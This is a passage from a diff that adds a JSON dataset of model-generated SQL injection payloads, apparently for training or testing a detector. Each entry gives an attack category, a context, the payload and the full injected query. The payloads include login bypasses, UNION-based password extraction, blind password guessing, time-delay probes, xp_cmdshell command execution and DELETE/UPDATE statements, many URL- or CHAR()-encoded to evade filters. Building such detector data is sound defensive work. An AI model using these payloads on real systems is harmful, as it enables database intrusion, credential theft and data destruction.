+    "full_query": "SELECT * FROM users WHERE username = 'CHAR(39) || ' OR ' || CHAR(39) || '1' || CHAR(39) || '=' || CHAR(39) || '1' || CHAR(39)' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "login",
+    "payload": "CHAR(34) || CHAR(37) || CHAR(42) || CHAR(34) || \" OR 'x'='x\"",
+    "full_query": "SELECT * FROM users WHERE username = 'CHAR(34) || CHAR(37) || CHAR(42) || CHAR(34) || \" OR 'x'='x\"' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "login",
+    "payload": "OR (SELECT 1 FROM users WHERE username = 'admin') #",
+    "full_query": "SELECT * FROM users WHERE username = 'OR (SELECT 1 FROM users WHERE username = 'admin') #' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "search",
+    "payload": "%' OR 'a'='a'",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%%' OR 'a'='a'%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "search",
+    "payload": "%' UNION ALL SELECT NULL, NULL, NULL, NULL#",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%%' UNION ALL SELECT NULL, NULL, NULL, NULL#%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "search",
+    "payload": "%'xp_cmdshell('dir')--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%%'xp_cmdshell('dir')--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "search",
+    "payload": "[\"%\\' ANDCHAR(65) = CHAR(65)--\"",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%[\"%\\' ANDCHAR(65) = CHAR(65)--\"%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "search",
+    "payload": "%\\'UNION ALLSELECTCHAR(73),CHAR(83),CHAR(75),NULL#\"",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%%\\'UNION ALLSELECTCHAR(73),CHAR(83),CHAR(75),NULL#\"%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "search",
+    "payload": "%\\'--%\\'OR \\'1\\'=\\'1\\\"\"",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%%\\'--%\\'OR \\'1\\'=\\'1\\\"\"%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "search",
+    "payload": "%\\'WAITFOR DELAY \\'0:0:10\\'AND \\'a\\'=\\'a\\\"\"",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%%\\'WAITFOR DELAY \\'0:0:10\\'AND \\'a\\'=\\'a\\\"\"%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "search",
+    "payload": "%\\'/*%\\'+CHAR(80)+CHAR(72)%\\'+*/--\"]",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%%\\'/*%\\'+CHAR(80)+CHAR(72)%\\'+*/--\"]%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "search",
+    "payload": "% OR (CAST(HEX(ASCII((SELECT USER()))) AS CHAR) = '68656c6c6f20776f726c64')",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%% OR (CAST(HEX(ASCII((SELECT USER()))) AS CHAR) = '68656c6c6f20776f726c64')%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "search",
+    "payload": "% AND (CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) = 'h') THEN 1 ELSE 0 END) --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%% AND (CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) = 'h') THEN 1 ELSE 0 END) --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "%22-1%22; WAITFOR DELAY+'0:0:5'+--",
+    "full_query": "SELECT * FROM users WHERE id = %22-1%22; WAITFOR DELAY+'0:0:5'+--",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "-9223372036854775807%22+WAITFOR+DELAY+'0:0:5'+--",
+    "full_query": "SELECT * FROM users WHERE id = -9223372036854775807%22+WAITFOR+DELAY+'0:0:5'+--",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "' AND 1=1 OR CAST('a' AS CHAR(1))='b'",
+    "full_query": "SELECT * FROM users WHERE id = ' AND 1=1 OR CAST('a' AS CHAR(1))='b'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "%22UNION+SELECT+'admin',NULL,NULL,NULL--",
+    "full_query": "SELECT * FROM users WHERE id = %22UNION+SELECT+'admin',NULL,NULL,NULL--",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "/*comment*/1'/**/or/**/CAST('0'/**/AS/**/CHAR(1))='1--",
+    "full_query": "SELECT * FROM users WHERE id = /*comment*/1'/**/or/**/CAST('0'/**/AS/**/CHAR(1))='1--",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "0x31'%20AND%20SUBSTR(password,1,1)%3D'0'--",
+    "full_query": "SELECT * FROM users WHERE id = 0x31'%20AND%20SUBSTR(password,1,1)%3D'0'--",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "order_filter",
+    "payload": ";WAITFOR DELAY '0:0:10'--\"",
+    "full_query": "SELECT * FROM orders WHERE status = ';WAITFOR DELAY '0:0:10'--\"' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "order_filter",
+    "payload": "OR+'a'='a'+UNION+SELECT+password+FROM+admin--\"",
+    "full_query": "SELECT * FROM orders WHERE status = 'OR+'a'='a'+UNION+SELECT+password+FROM+admin--\"' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "order_filter",
+    "payload": "%27%20OR%20CHAR(80)%3D'P'/*",
+    "full_query": "SELECT * FROM orders WHERE status = '%27%20OR%20CHAR(80)%3D'P'/*' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "order_filter",
+    "payload": "%27)%20UNION%20ALL%20SELECT%20CONCAT(username,%20'%20',%20password)%20FROM%20admin--",
+    "full_query": "SELECT * FROM orders WHERE status = '%27)%20UNION%20ALL%20SELECT%20CONCAT(username,%20'%20',%20password)%20FROM%20admin--' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "order_filter",
+    "payload": "/*--%20UNION%2bSELECT%2bdatabase()%2c%2bschema()%2c%2btable_name()%2c%2bcolumn_name()%2bFROM%2binformation_schema.*%2bWHERE%2btable_type%2b=%2b'TABLE'*/",
+    "full_query": "SELECT * FROM orders WHERE status = '/*--%20UNION%2bSELECT%2bdatabase()%2c%2bschema()%2c%2btable_name()%2c%2bcolumn_name()%2bFROM%2binformation_schema.*%2bWHERE%2btable_type%2b=%2b'TABLE'*/' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "--%3E%0D%0A1'%20and%20(SELECT%20DBMS_PIPE.RECEIVE_MESSAGE(%20CHR(66)%20||CHR(67)%20||CHR(79)%20||CHR(101),5))--",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '--%3E%0D%0A1'%20and%20(SELECT%20DBMS_PIPE.RECEIVE_MESSAGE(%20CHR(66)%20||CHR(67)%20||CHR(79)%20||CHR(101),5))--')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "<!--1';%20INSERT%20INTO%20dual%20(SELECT%20CHR((ASCII(substring(current_user,1,1))+1))),NULL--",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '<!--1';%20INSERT%20INTO%20dual%20(SELECT%20CHR((ASCII(substring(current_user,1,1))+1))),NULL--')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "%0D%0A1'%20OR%20CAST(NULL%20AS%20VARCHAR2)%20=%20DBMS_UTILITY.SQLID_TO_SQLHASH(CAST('bcpjqq2%20select%20(case%20when%20(4747=4747)%20then%201%20else%200%20end)%20from%20dual%20qqzvxq' AS VARCHAR2))%20--",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '%0D%0A1'%20OR%20CAST(NULL%20AS%20VARCHAR2)%20=%20DBMS_UTILITY.SQLID_TO_SQLHASH(CAST('bcpjqq2%20select%20(case%20when%20(4747=4747)%20then%201%20else%200%20end)%20from%20dual%20qqzvxq' AS VARCHAR2))%20--')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "%0D%0A1';%20WAITFOR%20DELAY%20'0:0:5'%20AND%20(select%20case%20when%20(1=1)%20then%20sys.fn_varbintohexstr(hashbytes('md5',current_timestamp))%20else%20null%20end)%20--",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '%0D%0A1';%20WAITFOR%20DELAY%20'0:0:5'%20AND%20(select%20case%20when%20(1=1)%20then%20sys.fn_varbintohexstr(hashbytes('md5',current_timestamp))%20else%20null%20end)%20--')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "%20or%20(select%20count(*)%20from%20users%20where%20username='admin'))--",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '%20or%20(select%20count(*)%20from%20users%20where%20username='admin'))--')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "%20waitfor%20delay%20'0:0:10'%20and%20exists(select%20*%20from%20products%20where%20product_name='Injection')",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '%20waitfor%20delay%20'0:0:10'%20and%20exists(select%20*%20from%20products%20where%20product_name='Injection')')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "--%3E%0D%0A1'%20UNION%20SELECT%20CHAR(65)%2BCHAR(66)%2BCHAR(67)%2BCHAR(68)%2BCHAR(69)%2BCHAR(70)%2BCHAR(71)%2BCHAR(72)%2BCHAR(73)%2BCHAR(74)%2BCHAR(75)%2BCHAR(76)%2BCHAR(77)%2BCHAR(78)%2BCHAR(79)%2BCHAR(80)%2BCHAR(81)%2BCHAR(82)%2BCHAR(83)%2BCHAR(84)%2BCHAR(85)%2BCHAR(86)%2BCHAR(87)%2BCHAR(88)%2BCHAR(89)%2BCHAR(90)",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '--%3E%0D%0A1'%20UNION%20SELECT%20CHAR(65)%2BCHAR(66)%2BCHAR(67)%2BCHAR(68)%2BCHAR(69)%2BCHAR(70)%2BCHAR(71)%2BCHAR(72)%2BCHAR(73)%2BCHAR(74)%2BCHAR(75)%2BCHAR(76)%2BCHAR(77)%2BCHAR(78)%2BCHAR(79)%2BCHAR(80)%2BCHAR(81)%2BCHAR(82)%2BCHAR(83)%2BCHAR(84)%2BCHAR(85)%2BCHAR(86)%2BCHAR(87)%2BCHAR(88)%2BCHAR(89)%2BCHAR(90)')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "<!--1';%20UPDATE%20comments%20SET%20body='%22%22--%20WHERE%20user_id=%27'",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '<!--1';%20UPDATE%20comments%20SET%20body='%22%22--%20WHERE%20user_id=%27'')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "%0D%0A1'%20OR%20EXISTS(SELECT%20*%20FROM%20information_schema.tables%20WHERE%20table_name=%22users%22%20AND%20table_schema=%22public%22)",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '%0D%0A1'%20OR%20EXISTS(SELECT%20*%20FROM%20information_schema.tables%20WHERE%20table_name=%22users%22%20AND%20table_schema=%22public%22)')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "/*1';%20CREATE%20TABLE%20test_table(a%20varchar(100));*/",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '/*1';%20CREATE%20TABLE%20test_table(a%20varchar(100));*/')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "<!--1';%20DELETE%20FROM%20comments%20WHERE%20body LIKE '%--%0D%0A'",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '<!--1';%20DELETE%20FROM%20comments%20WHERE%20body LIKE '%--%0D%0A'')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "login",
+    "payload": "' OR '1'='1' AND ((SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'admin') = 'a') --",
+    "full_query": "SELECT * FROM users WHERE username = '' OR '1'='1' AND ((SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'admin') = 'a') --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "login",
+    "payload": "5000  =  dbms_scheduler.get_job_state   (   (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5000  =  5000  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'admin' like '%",
+    "full_query": "SELECT * FROM users WHERE username = '5000  =  dbms_scheduler.get_job_state   (   (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5000  =  5000  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'admin' like '%' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "login",
+    "payload": "-1' OR EXISTS(SELECT * FROM users WHERE username LIKE '%admin%' AND password LIKE '%admin%')",
+    "full_query": "SELECT * FROM users WHERE username = '-1' OR EXISTS(SELECT * FROM users WHERE username LIKE '%admin%' AND password LIKE '%admin%')' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "login",
+    "payload": "' OR 1=(SELECT (SELECT COUNT(*)) FROM (SELECT 1) AS t) --",
+    "full_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT (SELECT COUNT(*)) FROM (SELECT 1) AS t) --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "gemini-3-flash-preview",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "login",
+    "payload": "admin' AND (SELECT 1 FROM (SELECT(IF(1=1,BENCHMARK(2000000,SHA1(1)),0)))x) AND '1'='1",
+    "full_query": "SELECT * FROM users WHERE username = 'admin' AND (SELECT 1 FROM (SELECT(IF(1=1,BENCHMARK(2000000,SHA1(1)),0)))x) AND '1'='1' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "gemini-3-flash-preview",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "login",
+    "payload": "' OR (SELECT 1 FROM (SELECT (SELECT (SELECT 'a'))) AS t)='a",
+    "full_query": "SELECT * FROM users WHERE username = '' OR (SELECT 1 FROM (SELECT (SELECT (SELECT 'a'))) AS t)='a' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "gemini-3-flash-preview",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "login",
+    "payload": "' OR (SELECT CASE WHEN (1=1) THEN (SELECT '1') ELSE (SELECT '0') END)='1",
+    "full_query": "SELECT * FROM users WHERE username = '' OR (SELECT CASE WHEN (1=1) THEN (SELECT '1') ELSE (SELECT '0') END)='1' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "gemini-3-flash-preview",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "login",
+    "payload": "' OR EXISTS(SELECT 1 FROM (SELECT 1) AS t1 WHERE EXISTS(SELECT 1 FROM (SELECT 1) AS t2)) --",
+    "full_query": "SELECT * FROM users WHERE username = '' OR EXISTS(SELECT 1 FROM (SELECT 1) AS t1 WHERE EXISTS(SELECT 1 FROM (SELECT 1) AS t2)) --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "gemini-3-flash-preview",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "login",
+    "payload": "1' AND (SELECT COUNT(*) FROM (SELECT * FROM (SELECT * FROM users LIMIT 2) AS t1 JOIN (SELECT * FROM users LIMIT 3) AS t2 UNION ALL SELECT NULL FROM users) AS t3) --",
+    "full_query": "SELECT * FROM users WHERE username = '1' AND (SELECT COUNT(*) FROM (SELECT * FROM (SELECT * FROM users LIMIT 2) AS t1 JOIN (SELECT * FROM users LIMIT 3) AS t2 UNION ALL SELECT NULL FROM users) AS t3) --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "login",
+    "payload": "(SELECT DBMS_PIPE.RECEIVE_MESSAGE('BAS', 5) FROM DUAL) AND ('%' = '%",
+    "full_query": "SELECT * FROM users WHERE username = '(SELECT DBMS_PIPE.RECEIVE_MESSAGE('BAS', 5) FROM DUAL) AND ('%' = '%' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "login",
+    "payload": "-1' UNION ALL SELECT username, password FROM users WHERE username = 'admin' --",
+    "full_query": "SELECT * FROM users WHERE username = '-1' UNION ALL SELECT username, password FROM users WHERE username = 'admin' --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "login",
+    "payload": "' OR (SELECT (CASE WHEN (1=1) THEN 'true' ELSE 'false' END) FROM (SELECT 1)) = 'true' --",
+    "full_query": "SELECT * FROM users WHERE username = '' OR (SELECT (CASE WHEN (1=1) THEN 'true' ELSE 'false' END) FROM (SELECT 1)) = 'true' --' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "search",
+    "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*) FROM users)) > 0 --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' AND (SELECT 1 FROM (SELECT COUNT(*) FROM users)) > 0 --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "search",
+    "payload": "' UNION ALL SELECT NULL, NULL, NULL, NULL FROM users --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' UNION ALL SELECT NULL, NULL, NULL, NULL FROM users --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "search",
+    "payload": "' OR EXISTS(SELECT 1 FROM (SELECT * FROM information_schema.tables WHERE table_name LIKE '%products%'))--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM (SELECT * FROM information_schema.tables WHERE table_name LIKE '%products%'))--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "search",
+    "payload": "' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '%admin%')) > 0--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '%admin%')) > 0--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "search",
+    "payload": "' OR (SELECT 1 FROM (SELECT * FROM orders WHERE order_date BETWEEN '2022-01-01' AND '2022-01-31'))--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM (SELECT * FROM orders WHERE order_date BETWEEN '2022-01-01' AND '2022-01-31'))--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "search",
+    "payload": "' AND (SELECT COUNT(*) FROM (SELECT * FROM categories WHERE category_id = (SELECT MIN(category_id) FROM categories))) > 0--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' AND (SELECT COUNT(*) FROM (SELECT * FROM categories WHERE category_id = (SELECT MIN(category_id) FROM categories))) > 0--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "search",
+    "payload": "' OR (SELECT 1 FROM (SELECT * FROM products WHERE price < (SELECT AVG(price) FROM products)))--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM (SELECT * FROM products WHERE price < (SELECT AVG(price) FROM products)))--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "search",
+    "payload": "' OR IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))=65,'a','b')--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))=65,'a','b')--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "search",
+    "payload": "' OR CAST((SELECT USER()) AS CHAR)",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR CAST((SELECT USER()) AS CHAR)%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "search",
+    "payload": "' OR (SELECT count(*) FROM products WHERE id=(SELECT min(id) FROM products)) --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR (SELECT count(*) FROM products WHERE id=(SELECT min(id) FROM products)) --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "search",
+    "payload": "' OR (SELECT pg_sleep(5)) --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%' OR (SELECT pg_sleep(5)) --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "user_lookup",
+    "payload": "%' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '')--",
+    "full_query": "SELECT * FROM users WHERE id = %' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '')--",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "user_lookup",
+    "payload": "WAITFOR DELAY '0:0:5' AND (1=1)",
+    "full_query": "SELECT * FROM users WHERE id = WAITFOR DELAY '0:0:5' AND (1=1)",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "nested_injection",
+    "template_context": "user_lookup",
+    "payload": "UNION ALL SELECT NULL,NULL,NULL FROM information_schema.tables WHERE table_name LIKE 'users'",
